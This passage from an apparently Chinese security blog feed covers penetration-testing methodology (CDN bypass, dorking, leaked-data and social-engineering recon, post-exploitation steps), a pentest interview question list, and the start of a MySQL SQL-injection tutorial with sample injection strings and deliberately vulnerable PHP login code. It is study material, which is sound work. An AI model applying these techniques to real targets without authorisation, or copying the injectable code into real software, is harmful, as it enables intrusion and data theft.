Network），中文全称为内容分发网络。</p><p>简单的说就是一组在不同运营商之间的对接点上的高速缓存服务器，把用户经常访问的<strong>静态数据</strong>资源直接<strong>缓存</strong>到节点服务器上，当用户再次请求时，会直接分发到离用户近的节点服务器上响应给用户，当用户<strong>有实际数据交互时</strong>才会<strong>从远程Web服务器上响应</strong>，这样可以大大提高网站的响应速度及用户体验。</p><h4 id="为什么-1"><a href="#为什么-1" class="headerlink" title="为什么"></a>为什么</h4><ul><li>绕过寻找真实IP</li><li>绕过云Waf</li></ul><h4 id="判断CDN"><a href="#判断CDN" class="headerlink" title="判断CDN"></a>判断CDN</h4><ul><li><p>反查域名 IP，看结果是否有大量不相关的域名存在</p></li><li><p>观察请求响应的返回数据的头部，是否有 CDN 服务商标识</p></li><li><p>通过不同定位地点的 ping 测试，如果没有使用CDN，则只会显示一个IP地址。</p><ul><li><a href="http://www.webkaka.com/Ping.aspx">http://www.webkaka.com/Ping.aspx</a>（国内+国外）</li><li><a href="https://www.host-tracker.com/v3/check/">https://www.host-tracker.com/v3/check/</a>  （国外）</li></ul></li><li><p>判断 IP 是否在常见 CDN 服务商的服务器 IP 段上</p></li><li><p>若 asp 或者 asp.net 网站返回头的 server 不是 IIS、而是 Nginx，则多半使用了nginx反向代理到 CDN</p></li><li><p>利用 Nslookup 查询域名</p><ul><li><p>服务器名称</p><p><img src="/../images/image-20230509225424444-1685533751888.png" alt="image-20230509225424444"></p></li><li><p>同一个域名解析对应多个 IP 地址</p><p><img src="/../images/image-20230509225313449-1685533751888.png" alt="image-20230509225313449"></p></li></ul></li></ul><h4 id="CDN绕过方法"><a href="#CDN绕过方法" class="headerlink" title="CDN绕过方法"></a>CDN绕过方法</h4><h5 id="CDN费用"><a href="#CDN费用" class="headerlink" title="CDN费用"></a>CDN费用</h5><p>CDN 加速需要支付一定的费用，所以<strong>子站，国外</strong>很可能没有部署CDN。</p><h5 id="历史-DNS-记录"><a href="#历史-DNS-记录" class="headerlink" title="历史 DNS 记录"></a>历史 DNS 记录</h5><p><a href="https://viewdns.info/iphistory/?domain=www.baidu.com">IP History - ViewDNS.info</a></p><p><a href="https://x.threatbook.com/v5/domain/www.baidu.com?source=top">微步在线X情报社区-威胁情报查询_威胁分析平台_开放社区</a></p><h5 id="邮箱"><a href="#邮箱" class="headerlink" title="邮箱"></a>邮箱</h5><blockquote><p>用目标邮件服务器发送邮件给自己(QQ邮箱)再查看邮件源码一定情况下可以找到真实IP（服务端和我们建立连接）</p><p>这里还有一个<code>奇淫技巧</code>，通过发送邮件给一个不存在的邮箱地址，比如 <a href="mailto:000xxx@domain.com">000xxx@domain.com</a> ，因为该用户不存在，所以发送将失败，并且还会收到一个包含发送该电子邮件给你的服务器的真实 IP 通知。</p></blockquote><ul><li>RSS 订阅</li><li>邮箱注册、激活处</li><li>邮箱找回密码处</li><li>产品更新的邮件推送</li><li>某业务执行后发送的邮件通知</li><li>员工邮箱、邮件管理平台等入口处的忘记密码</li></ul><h5 id="virtual-host-碰撞"><a href="#virtual-host-碰撞" class="headerlink" title="virtual-host 碰撞"></a>virtual-host 碰撞</h5><p>原理：<a href="https://mp.weixin.qq.com/s/o8uAPbw7OSdFhHKOpOYKvg">https://mp.weixin.qq.com/s/o8uAPbw7OSdFhHKOpOYKvg</a></p><ul><li>当我们收集了目标足够多的可能的真实 IP 时，可以通过 IP 和子域的碰撞，来批量获得命中目标以及目标哪些的子域。</li><li>在线收集工具 <a href="https://pentest-tools.com/information-gathering/find-virtual-hosts">https://pentest-tools.com/information-gathering/find-virtual-hosts</a></li></ul><h5 id="空间测绘引擎"><a href="#空间测绘引擎" class="headerlink" title="空间测绘引擎"></a>空间测绘引擎</h5><ul><li><p>favicon.ico 哈希特征</p></li><li><p>网页源码特征值</p><blockquote><p>在服务器源 IP 地址允许访问并且返回的也是类似的网站内容情况下，可以通过侦察页面源码中 JS 、CSS 、HTML 等一系列静态特征值，然后用 Shodan 、Zoomeye 、Censys 等搜索引擎进行匹配搜索，从而定位 IP 。</p></blockquote></li></ul><h4 id="真实-IP-使用"><a href="#真实-IP-使用" class="headerlink" title="真实 IP 使用"></a>真实 IP 使用</h4><p>在获取到真实IP后，通过直接访问IP可能无法访问</p><ul><li><p>修改 hosts 文件</p></li><li><p>burpsuite 测试</p><p><img src="/../images/image-20230510181257028-1685533751888.png" alt="image-20230510181257028"></p></li></ul><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>FCDN</p><h3 id="C段及端口扫描"><a href="#C段及端口扫描" class="headerlink" title="C段及端口扫描"></a>C段及端口扫描</h3><h4 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap</span><br><span class="line">masscan</span><br><span class="line">goby</span><br></pre></td></tr></table></figure><h4 id="常见端口利用"><a href="#常见端口利用" class="headerlink" title="常见端口利用"></a>常见端口利用</h4><p><a href="http://zhuabapa.top/2020/06/03/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">‘常用端口利用总结’ | zer0_c|imb’s blog</a></p><h1 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h1><h2 id="为什么-2"><a href="#为什么-2" class="headerlink" title="为什么"></a>为什么</h2><ul><li><p>运气好，一步到位</p></li><li><p>制作有针对性的弱口令字典</p></li><li><p>🎣</p></li></ul><h2 id="搜索引擎-1"><a href="#搜索引擎-1" class="headerlink" title="搜索引擎"></a>搜索引擎</h2><ul><li><p>针对信息泄露的在线网站</p><ul><li><p><a href="https://leakix.net/">LeakIX</a></p></li><li><p><a href="https://intelx.io/">https://intelx.io/</a></p></li><li><p><a href="https://haveibeenpwned.com/">https://haveibeenpwned.com/</a></p></li><li><p><a href="https://aleph.occrp.org/">https://aleph.occrp.org/</a></p></li><li><p><a href="https://dehashed.com/">https://dehashed.com/</a></p></li></ul></li><li><p><code>Google Hacking</code></p><ul><li><p>常用语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com  账号 | 密码 | 工号 | 学号 | 身份证 | 公示 | 邮箱</span><br></pre></td></tr></table></figure></li><li><p>工具</p><p><a href="https://github.com/dwisiswant0/go-dork">https://github.com/dwisiswant0/go-dork</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.\go-dork.exe -q &quot;[语法]&quot; -p [页面数量] -x http://127.0.0.1:33210 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">一页10个数据</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-e 指定引擎 测试了只有google可以</span><br><span class="line">Google, Shodan, Bing, Duck, Yahoo, Ask</span><br></pre></td></tr></table></figure><p>​<img src="/../images/image-20230510222146978-1685533751888.png" alt="image-20230510222146978"></p></li></ul></li></ul><p>​</p><ul><li><p>网站</p><p><a href="https://ght.se7ensec.cn/#">在线Google Hacking小工具</a></p><p><img src="/../images/image-20230509215656848-1685533751889.png" alt="image-20230509215656848"></p><p><a href="https://www.exploit-db.com/google-hacking-database">Google Hacking Database (GHDB) - Google Dorks, OSINT, Recon</a></p><p><img src="/../images/image-20230509151606375-1685533751889.png" alt="image-20230509151606375"></p></li></ul><h2 id="目录-x2F-文件扫描"><a href="#目录-x2F-文件扫描" class="headerlink" title="目录&#x2F;文件扫描"></a>目录&#x2F;文件扫描</h2><p><strong>关键是字典，需要积累字典</strong></p><ul><li><p>工具：dirsearch</p></li><li><p>字典</p><p>将工具内置字典和公开字典进行整合，然后自己在实际中遇到的再添加。</p></li><li><p>注意点</p><p>403&#x2F;404状态码，可以进行逐级目录扫描</p><p>扫IP和扫域名是不一样的，因为一个ip可能有多个域名</p></li></ul><h2 id="JS信息"><a href="#JS信息" class="headerlink" title="JS信息"></a>JS信息</h2><p>可能泄露接口，后台地址，密码等敏感信息</p><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><ul><li><p>工具</p><p><code>Urlfinder</code>  （推荐）</p></li><li><p>浏览器插件</p><p>Superesearch</p><p>用工具找到的路径需要验活，有时候还需要拼接一级路由才可以（一级路由等可以通过抓包分析得到）。</p></li></ul><h3 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h3><blockquote><p>Webpack 是一个现代化的 JavaScript 模块打包工具，用于构建复杂的前端应用程序。它可以将多个 JavaScript 文件、样式表、图片等静态资源打包成一个或多个优化的文件，以提高应用程序的性能和加载速度。</p></blockquote><p>遇到的时候可以用<a href="https://github.com/rtcatc/Packer-Fuzzer%E8%B7%91%E4%B8%80%E4%B8%8B%E3%80%82">https://github.com/rtcatc/Packer-Fuzzer跑一下。</a></p><h2 id="代码托管平台"><a href="#代码托管平台" class="headerlink" title="代码托管平台"></a>代码托管平台</h2><ul><li><p>github</p><p>工具</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/damit5/gitdorks_go</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./gitdorks_go_amd_linux -gd Dorks/smalldorks.txt -nws 20 -target gm7.org -tf tokenFile/tf.txt -ew 3</span><br></pre></td></tr></table></figure><blockquote><p><code>./tokenFile/tf.txt</code> → <code>Github access token</code></p><p><code>../Dorks/smalldorks.txt</code> →  <code>关键字字典</code></p></blockquote></li><li><p>GitLab: <a href="https://about.gitlab.com/">https://about.gitlab.com/</a></p></li><li><p>gitee: <a href="https://gitee.com/">https://gitee.com/</a></p></li></ul><h2 id="招聘信息"><a href="#招聘信息" class="headerlink" title="招聘信息"></a>招聘信息</h2><p>可以通过该公司的招聘岗位信息，分析其技术栈，得到对方网站的架构。</p><h2 id="网盘信息"><a href="#网盘信息" class="headerlink" title="网盘信息"></a>网盘信息</h2><p>聚合网站：<a href="https://www.chaonengsou.com/">超能搜 - 百度网盘搜索神器</a></p><h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><blockquote><p>从各第三方历史漏洞库中查找目标曾经泄露的 各种敏感账号密码 [ 国内目标很好使？ ]</p></blockquote><p><a href="https://www.cnvd.org.cn/">国家信息安全漏洞共享平台</a></p><p><a href="https://src.sjtu.edu.cn/">主页 | 教育漏洞报告平台</a></p><h2 id="技术文档-x2F-wiki-x2F-知识库"><a href="#技术文档-x2F-wiki-x2F-知识库" class="headerlink" title="技术文档 &#x2F; wiki &#x2F;知识库"></a>技术文档 &#x2F; wiki &#x2F;知识库</h2><p>目标自己对外提供的各种文档里泄露的各种账号密码及其它敏感信息</p><ul><li><p>官网</p></li><li><p><a href="https://www.yuque.com/dashboard">工作台 · 语雀</a></p></li><li><p>百度文库：<a href="https://wenku.baidu.com/">https://wenku.baidu.com</a></p><p>原创力文档：<a href="https://max.book118.com/">https://max.book118.com</a></p><p>凌风云：<a href="https://wenku.lingfengyun.com/">https://wenku.lingfengyun.com</a></p></li></ul><h2 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h2><h3 id="打入目标内部"><a href="#打入目标内部" class="headerlink" title="打入目标内部"></a>打入目标内部</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加入内部QQ群 / 微信群 / 钉钉群 等</span><br><span class="line">社工内部人员</span><br></pre></td></tr></table></figure><h3 id="个人信息使用"><a href="#个人信息使用" class="headerlink" title="个人信息使用"></a>个人信息使用</h3><ul><li><p>将前面收集到的姓名，邮箱，手机号等个人信息放入社工库查询</p></li><li><p><a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></p><blockquote><p>通过搜索引擎、PGP服务器以及SHODAN数据库收集用户的email，子域名，主机，雇员名，开放端口和banner信息。</p></blockquote></li><li><p>生成社工字典，进行口令爆破</p><p><a href="https://github.com/zgjx6/SocialEngineeringDictionaryGenerator">https://github.com/zgjx6/SocialEngineeringDictionaryGenerator</a></p></li></ul><h1 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h1><h2 id="为什么-3"><a href="#为什么-3" class="headerlink" title="为什么"></a>为什么</h2><ul><li><p><strong>筛选出最可能有漏洞的点</strong></p></li><li><p><strong>识别waf</strong></p></li></ul><h2 id="指纹识别-1"><a href="#指纹识别-1" class="headerlink" title="指纹识别"></a>指纹识别</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><a href="https://github.com/TideSec/TideFinger/blob/master/Web%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6%E4%B8%8E%E4%BC%98%E5%8C%96%E5%AE%9E%E7%8E%B0.md">TideFinger&#x2F;Web指纹识别技术研究与优化实现.md at master · TideSec&#x2F;TideFinger</a></p><h3 id="Web应用框架"><a href="#Web应用框架" class="headerlink" title="Web应用框架"></a>Web应用框架</h3><h4 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h4><ul><li><p><a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a></p><p><img src="/../images/image-20230511175807888-1685533751889.png" alt="image-20230511175807888"></p></li><li><p><a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></p><p><img src="/../images/image-20230511110926338-1685533751889.png" alt="image-20230511110926338"></p></li></ul><h4 id="在线网站"><a href="#在线网站" class="headerlink" title="在线网站"></a>在线网站</h4><ul><li><p><a href="https://fp.shuziguanxing.com/#/">指纹收录平台</a></p></li><li><p><a href="http://www.yunsee.cn/">云悉互联网WEB资产在线梳理|在线CMS指纹识别平台 - 云悉安全平台</a>（要注册,有一定门槛）</p></li><li><p><a href="http://finger.tidesec.com/">http://finger.tidesec.com/</a></p></li></ul><h4 id="浏览器插件"><a href="#浏览器插件" class="headerlink" title="浏览器插件"></a>浏览器插件</h4><p>Wappalyzer</p><h4 id="手工"><a href="#手工" class="headerlink" title="手工"></a>手工</h4><ul><li>前端js代码，文件名，路径等放到github，gitee搜</li><li>icon信息等放到空间搜索引擎</li><li>图片搜索（不过通常会进行替换）</li><li>版权标识如url，logo等（注释或者删除了）</li></ul><h3 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h3><ul><li><p>查看返回包有无WAF字样</p><p><img src="/../images/image-20230511233014884-1685533751889.png" alt="image-20230511233014884"></p></li><li><p><a href="https://github.com/EnableSecurity/wafw00f">WAFW00F </a></p></li><li><p>查看拦截页面信息</p><blockquote><p>通过一些明显的注入来触发waf</p></blockquote><p><a href="https://cloud.tencent.com/developer/beta/article/1872310">83个Waf拦截页面-腾讯云开发者社区-腾讯云</a>  （5年前）</p><p><a href="https://mp.weixin.qq.com/s/8F060FU9g_78z57UKS-JsQ">30几款常见WAF的拦截页整理</a>   （2021年）</p></li></ul><h3 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h3><p><a href="https://github.com/cnrstar/anti-honeypot">https://github.com/cnrstar/anti-honeypot</a></p><p><a href="https://send-safe-honeypot-hunter.apponic.com/">https://send-safe-honeypot-hunter.apponic.com/</a></p><h1 id="漏洞探测与利用"><a href="#漏洞探测与利用" class="headerlink" title="漏洞探测与利用"></a>漏洞探测与利用</h1><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><p>经过信息收集得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web服务 （架构，中间件，目录结构）</span><br><span class="line">端口服务</span><br><span class="line">敏感信息 （敏感文件，社工信息）</span><br><span class="line">重点攻击对象</span><br><span class="line">站点是否存在waf</span><br></pre></td></tr></table></figure><p>接下来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">漏扫</span><br><span class="line">手工</span><br><span class="line">绕waf</span><br><span class="line">代码审计</span><br></pre></td></tr></table></figure><h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统漏洞 </span><br><span class="line">web漏洞 </span><br><span class="line">中间件漏洞 </span><br><span class="line">端口服务漏洞 </span><br><span class="line">业务逻辑漏洞</span><br><span class="line">通信安全</span><br></pre></td></tr></table></figure><p>可以参照漏洞checklist来进行检测。</p><h1 id="待做"><a href="#待做" class="headerlink" title="待做"></a>待做</h1><blockquote><p>把上面的几个步骤，工具串起来，行成快速信息收集，快速探测打点，最好写个贯穿流程的工具调用的脚本。</p></blockquote><p>参考：<a href="https://www.se7ensec.cn/2023/02/14/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%9E%E7%8E%B0/">https://www.se7ensec.cn/2023/02/14/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%9E%E7%8E%B0/</a></p><h1 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h1><p><img src="/../images/image-20230510184801834-1685533751889.png" alt="image-20230510184801834"></p><p>实操过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域信息收集</span><br><span class="line">linux提权</span><br><span class="line">代理穿透（socket5，frp，re_George，proxifer）</span><br><span class="line">文件传输</span><br><span class="line">简单免杀</span><br><span class="line">mimikatz</span><br><span class="line">ipc$（使用，权限问题）</span><br><span class="line">pth哈希传递</span><br><span class="line">msf使用</span><br></pre></td></tr></table></figure><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">内网搜集/探测 =&gt;  免杀提权[非必须] =&gt; 抓取登录凭证 =&gt; （跨）平台横向 =&gt; 入口维持 =&gt; 数据回传 =&gt; 定期权限维护</span><br></pre></td></tr></table></figure><p><a href="https://0range-x.github.io/2022/01/26/Domain-penetration_one-stop/">域渗透一条龙手册</a></p><h1 id="产出报告"><a href="#产出报告" class="headerlink" title="产出报告"></a>产出报告</h1><p><a href="https://www.anquanke.com/post/id/215031#h3-5">如何编写一份专业的渗透测试报告-安全客 - 安全资讯平台</a></p><p><a href="https://github.com/Potato-py/ExportReport">Potato-py&#x2F;ExportReport: 本项目用于自动化生成报告。可根据项目需求，通过简单的提取变量来自定义报告模板。内附常见扫描器API&#x2F;原报告(awvs、xray、goby)数据提取模块，可直接生成全新的自定义报告。 对有复杂的功能需求时，适用于有Python基础的人使用。 本项目内附二次开发所用的资料文档，欢迎各位提Pull Request</a></p><p><a href="https://github.com/awake1t/HackReport/tree/main/01-%E6%8A%A5%E5%91%8A%E6%A8%A1%E6%9D%BF">HackReport&#x2F;01-报告模板 at main · awake1t&#x2F;HackReport</a></p><p><strong>修复建议–渗透测试修复建议总结.pdf</strong></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.gm7.org/">Introduction </a></p><p><a href="https://gitbook.se7ensec.cn/#duan-kou-sao-miao">在线工具 - 肾透测试中心</a></p><p><a href="https://gitbook.se7ensec.cn/hong-dui-zuo-zhan-shou-ce#liu-cheng-jian-yao-shuo-ming">红队作战手册 - 肾透测试中心</a></p><p><a href="https://github.com/bin-maker/BYPASS-CDN/">https://github.com/bin-maker/BYPASS-CDN/</a></p><p><a href="https://www.secpulse.com/archives/194410.html">https://www.secpulse.com/archives/194410.html</a></p><p><a href="https://wiki.wgpsec.org/knowledge/">狼组安全团队公开知识库</a></p><p><a href="https://www.wangan.com/p/7fy7fy135d85fec8">https://www.wangan.com/p/7fy7fy135d85fec8</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>实习面试</title>
      <link href="/2023/06/21/%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95/"/>
      <url>/2023/06/21/%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><ul><li>自我介绍</li><li>讲一下反序列化漏洞</li><li>dnslog了解吗，是在命令有回显还是无回显的时候用</li><li>dnslog和反弹shell有什么区别</li><li>一句话木马和内存马有什么区别</li><li>常见的waf绕过方式</li><li>文件上传讲讲</li><li>逻辑漏洞知道哪些</li><li>未授权访问漏洞你是怎么挖到的</li><li>sql注入你会用到哪些函数</li><li>spring框架漏洞</li><li>阿里的druid了解吗</li><li>docker容器漏洞，在实战中有遇见过吗</li><li>weblogic框架漏洞</li><li>知道哪些CMS</li><li>若依CMS漏洞知道吗</li><li>2022年以后的漏洞知道哪些</li><li>你了解我们公司吗</li><li>你怎么看待加班</li></ul>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sql注入详解--Mysql</title>
      <link href="/2023/06/01/%E9%80%9A%E8%BF%87Mysql%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/06/01/%E9%80%9A%E8%BF%87Mysql%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>服务器将<strong>用户提交的参数</strong>错误地<strong>拼接到sql语句中</strong>，<strong>打破了数据区域的边界（数字型不需要）改变了原有的sql执行逻辑</strong>，导致攻击者可以执行恶意的sql语句。</p><p>简单的例子</p><p>假设</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from users where id=&#x27;<span class="subst">$id</span>&#x27;;&quot;</span></span><br></pre></td></tr></table></figure><p>用户提交</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and 1=1 #</span></span><br></pre></td></tr></table></figure><p>拼接后的sql语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and 1=1 #&#x27;</span><br></pre></td></tr></table></figure><p>要进行注入，只需要将<code>and 1=1</code>部分替换为其他sql语句即可。</p><blockquote><p>其实分析<code>sqlmap</code>的注入也是如此，注入语句由<code>prefix</code>，<code>payload</code>和<code>suffix</code>组成</p></blockquote><p>图来源<a href="https://www.freebuf.com/column/161797.html">https://www.freebuf.com/column/161797.html</a></p><p><img src="/../images/image-20230522131723064.png" alt="image-20230522131723064"></p><h2 id="漏洞危害–攻击面"><a href="#漏洞危害–攻击面" class="headerlink" title="漏洞危害–攻击面"></a>漏洞危害–攻击面</h2><ul><li><p>拿到敏感信息，如手机号，身份证，邮箱，家庭地址等</p></li><li><p>后台账号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">万能密码？这年头还有吗🤔</span><br><span class="line">拿到密码，但是一般密码都是加盐再加密的了吧，需要彩虹表啥的。</span><br><span class="line">或者堆叠注入创建一个，修改一个等                       </span><br></pre></td></tr></table></figure></li><li><p>文件任意读取</p></li><li><p>Getshell</p></li><li><p>RCE</p></li><li><p>提权</p></li></ul><h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img src="/../images/image-20230522131900429.png" alt="image-20230522131900429"></p><h4 id="站库分离"><a href="#站库分离" class="headerlink" title="站库分离"></a>站库分离</h4><h5 id="为什么"><a href="#为什么" class="headerlink" title="为什么"></a>为什么</h5><p>站库分离，所以不能通过数据库进行读写操作</p><ul><li>读取账密，转到web服务器上打</li><li>信息收集，数据库服务器是否在内网中</li></ul><h5 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h5><ul><li><p>通用方法</p><p>读取配置文件，判断IP</p></li><li><p>Mysql</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@hostname; //服务端主机名称 </span><br><span class="line">select * from information_schema.PROCESSLIST; //客户端主机名称和端口</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">  &gt; Windows连接格式：主机名:Port</span><br><span class="line">  &gt;</span><br><span class="line">  &gt; Linux连接格式：IP:Port</span><br><span class="line">  &gt;</span><br><span class="line">&gt; 本地连接格式：localhost:Port</span><br><span class="line">  </span><br><span class="line">![image-20230522203905326](../images/image-20230522203905326.png)</span><br><span class="line">  </span><br><span class="line">  ```mysql</span><br><span class="line">  select user()；</span><br></pre></td></tr></table></figure><blockquote><p>如果不是localhost，大概率是站库分离。</p></blockquote><p>  <img src="/../images/image-20230522204233420.png" alt="image-20230522204233420"></p><h4 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h4><p><img src="/../images/image-20230519205623244-1685603526750.png"></p><h4 id="各种信息"><a href="#各种信息" class="headerlink" title="各种信息"></a>各种信息</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ifnull(@@secure_file_priv,0) secure_file_priv为空时返回0,不为空时返回其值</span><br><span class="line">SELECT concat_ws(0x0a,</span><br><span class="line">ifnull(@@secure_file_priv,0),</span><br><span class="line">concat_ws(0xefbc8c, @@version, @@version_compile_os, @@version_compile_machine, @@version_comment),</span><br><span class="line">concat_ws(0xefbc8c, @@hostname, @@port),</span><br><span class="line">concat_ws(0xefbc8c, user(), database()),</span><br><span class="line">concat_ws(0xefbc8c, @@datadir, @@plugin_dir, @@tmpdir, @@basedir)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 结果</span><br><span class="line">0</span><br><span class="line">10.5.8-MariaDB-3，debian-linux-gnu，x86_64，Debian buildd-unstable</span><br><span class="line">kali，3306</span><br><span class="line">root@localhost</span><br><span class="line">/var/lib/mysql/，/usr/lib/mysql/plugin/，/tmp，/usr</span><br></pre></td></tr></table></figure><h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><h4 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h4><p>一切与数据库有交互的地方，取决于后端从HTTP请求报文中提取了什么数据并拼接到sql语句中。</p><h4 id="是否存在sql注入"><a href="#是否存在sql注入" class="headerlink" title="是否存在sql注入"></a>是否存在sql注入</h4><ul><li><p>字符型or数字型：fuzz闭合类型</p></li><li><p>是否有报错，是否能逃逸执行sql语句（逻辑，延时等判断）</p></li></ul><h4 id="后端语句"><a href="#后端语句" class="headerlink" title="后端语句"></a>后端语句</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 得到后端执行的sql语句</span><br><span class="line">select * from test.users where id=1 union SELECT (select INFO FROM INFORMATION_SCHEMA.PROCESSLIST WHERE INFO LIKE &#x27;%673245283%&#x27; LIMIT</span><br><span class="line"> 1),2,3;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528210843123.png" alt="image-20230528210843123"></p><h3 id="Mysql注入手段"><a href="#Mysql注入手段" class="headerlink" title="Mysql注入手段"></a>Mysql注入手段</h3><h4 id="admin登入"><a href="#admin登入" class="headerlink" title="admin登入"></a>admin登入</h4><ul><li><p>万能密码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 后端代码Demo</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="subst">$user</span>&#x27; and passwd=&#x27;<span class="subst">$passwd</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;登陆成功&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过布尔运算让where恒为真</p><p><img src="/../images/image-20230312212035948.png" alt="image-20230312212035948"></p></li><li><p>注册覆盖</p><blockquote><p>admin (有个空格)或者 (有个空格)admin</p><p>原理：用户名字段长度&gt;5，所以可以添加空格，而sql语句执行时会将空格忽略。</p></blockquote><p><img src="/../images/image-20230312210909402.png" alt="image-20230312210909402"></p></li><li><p>联合查询构造临时用户</p><p><code>[GXYCTF2019]BabySQli</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 后端代码Demo</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQL语句有误：&#x27;</span>.<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="variable">$users</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>)) &#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;抱歉，用户名或者密码错误。&#x27;);history.back();&lt;/Script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$passwords</span>=<span class="variable">$users</span>[<span 